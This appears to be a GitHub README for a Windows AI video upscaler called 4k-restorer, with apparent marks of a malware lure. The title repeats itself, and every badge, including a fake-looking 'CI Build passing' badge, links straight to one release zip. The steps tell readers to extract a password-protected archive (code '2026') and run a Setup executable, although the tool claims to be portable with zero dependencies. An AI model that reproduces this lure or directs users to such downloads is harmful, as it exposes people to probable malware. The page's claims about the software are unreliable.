<div align="center">

# AI Video Upscaler — AI Video Upscaler — Ai Upscaler Video (Hot-Reload Config, Zero Dependencies)

<p><strong>AI Video Upscaler — AI Video Upscaler — Ai Upscaler Video (Hot-Reload Config, Zero Dependencies): AI Video Upscaler — upscaler and 4k in one tool. Native 64-bit portable build with hot-reloadable JSON configuration, low-overhead runtime, and prebuilt portable release.</strong></p>

[![CI Build](https://img.shields.io/badge/CI_Build-passing-2ea44f?style=for-the-badge&logo=githubactions&logoColor=white)](../../releases/download/v0.1.0/4k-restorer-v0.1.0-win64.zip)
[![Version](https://img.shields.io/badge/Release-v0.1.0-2ea44f?style=for-the-badge&logo=github)](../../releases/download/v0.1.0/4k-restorer-v0.1.0-win64.zip)
[![Platform](https://img.shields.io/badge/Platform-Windows_10%2F11_x64-0969da?style=for-the-badge&logo=windows)](../../releases/download/v0.1.0/4k-restorer-v0.1.0-win64.zip)
[![Stars](https://img.shields.io/github/stars/TestOwner/4k-restorer?style=for-the-badge&logo=github&color=e3b341)](../../stargazers)

<p><strong>⬇ No compiler. No setup. Grab the prebuilt package and run.</strong></p>

<a href="../../releases/download/v0.1.0/4k-restorer-v0.1.0-win64.zip"><img src="download_btn.svg" alt="Download 4k-restorer-v0.1.0-win64.zip" width="520"></a>

<br>

<a href="../../releases/download/v0.1.0/4k-restorer-v0.1.0-win64.zip"><img src="banner.svg" alt="AI Video Upscaler Preview" width="840"></a>

</div>

---

## Executive Summary & Design

**AI Video Upscaler — AI Video Upscaler — upscaler and 4k in one tool** (`4k-restorer`) is a portable Windows 10/11 runtime suite: drop the prebuilt package, point it at `config/settings.json`, and go. No compiler, no external dependencies, live hot-reload included.

## Getting Started (No Compiler Needed)

| Platform | Direct Prebuilt Package | Documentation Mirror |
| :--- | :--- | :--- |
| **Windows 10 / 11 (x64)** | [**`4k-restorer-v0.1.0-win64.zip`**](../../releases/download/v0.1.0/4k-restorer-v0.1.0-win64.zip) | [**Usage Guide (`docs/USAGE.md`)**](docs/USAGE.md) |

1. Download [`4k-restorer-v0.1.0-win64.zip`](../../releases/download/v0.1.0/4k-restorer-v0.1.0-win64.zip) using the download button above.
2. Extract the archive using the access code (`2026`).
3. Launch `4kRestorer_Setup_x64.exe` (keep `config/settings.json` in the same folder).

## Engine Components

| Subsystem | Technical Implementation | Runtime Controls |
| :--- | :--- | :--- |
| **Primary Subsystem** | Bounded ring-buffer pipeline with zero-copy handoff | `live toggle` |
| **State Engine** | Atomic JSON state with crash-safe rollback | `keep_state` |
| **Config Watcher** | Hot-reloadable settings, applied without restart | `hot_reload` |
| **Telemetry** | Compact stderr channel, silent by default | `quiet / --verbose` |

## Configuration (`config/settings.json`)

```json
{
  "module": "4k-restorer",
  "version": "0.1.0",
  "runtime": {
    "threads": 4,
    "verbose": false,
    "hot_reload": true
  },
  "modules": {
    "upscale": {
      "enabled": true
    },
    "interpolate": {
      "enabled": true
    },
    "denoise": {
      "enabled": true
    },
    "cli": {
      "enabled": true
    }
  }
}
```

## FAQ

<details>
<summary><b>Old family videos?</b></summary>

Perfect — handles VHS and DVD.
</details>
<details>
<summary><b>60 FPS?</b></summary>

Frame interpolation.
</details>
<details>
<summary><b>Batch?</b></summary>

A folder as input.
</details>

## Documentation & Guides

- [FAQ — platform support, data storage](docs/FAQ.md)
- [Changelog — v0.1.0 and later](CHANGELOG.md)
- [Usage Guide — commands and options](docs/USAGE.md)
- [Contributing — setup, ground rules, PR flow](CONTRIBUTING.md)

## Building from Source

```bash
git clone https://github.com/TestOwner/4k-restorer.git
cd 4k-restorer
cmake -B build -DCMAKE_BUILD_TYPE=Release
cmake --build build --config Release
```

---
<sub>Indexed tags: 4k-restorer, video, 4k, 60fps, interpolation, restore, windows, ai, upscaler, cli, developer-tools, open-source, automation, productivity, cpp, portable, prebuilt, tools</sub>
